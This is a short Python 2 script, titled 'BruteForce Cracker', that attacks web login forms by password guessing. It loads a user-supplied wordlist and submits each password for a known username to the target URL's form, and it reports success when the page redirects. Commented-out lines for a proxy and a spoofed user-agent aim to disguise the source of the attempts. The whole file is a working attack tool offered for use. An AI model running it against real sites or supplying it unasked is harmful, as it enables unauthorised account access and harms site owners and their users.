print "----------------BruteForce Cracker--------------"
print "Inspect the login form for details to use this method"
print "------------------------------------------------"
import mechanize

#proxy=["'http':37.61.224.243:8181"]

#Adding headers so that it appear to come from different browser
#userAgent=[('User-agent'.'Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285')]

data=mechanize.Browser(factory=mechanize.RobustFactory())

#data.addheaders=userAgent

#data.set_proxies(proxy)

#url='http://192.168.0.1'
url=raw_input("Enter the url:")

wordlist=raw_input("Enter wordlist file:")
#wordlist='bruteforce.txt'
try:
    wordlist=open(wordlist,'r')
    wordlist=wordlist.read()
    wordlist=wordlist.split()
except:
    print "\n!!!Wordlist not found!!!"
    quit()

#print "--------Login Form name-------"
#print "*Enter nr=0 for  no name"
#fname=raw_input("Enter name of loginform:")



print "-------------Select Method Type-----------"
print "GET "
print "POST "   
print "------------------------------------------"

mname=raw_input("Please select one:")


uname=raw_input("Enter name field of userid:")
username=raw_input("Enter the known username:")

pname=raw_input("Enter name field of password:")
for password in wordlist:
    response=data.open(url)
  
    data.select_form(nr=0)
    data.form[uname]=username
    
   
    data.form[pname]=password
    data.method=mname
    response=data.submit()

    if response.geturl() == url :
	print "Checking:%s"%password
    else :
	print "Password Found:%s"%password
        break
        
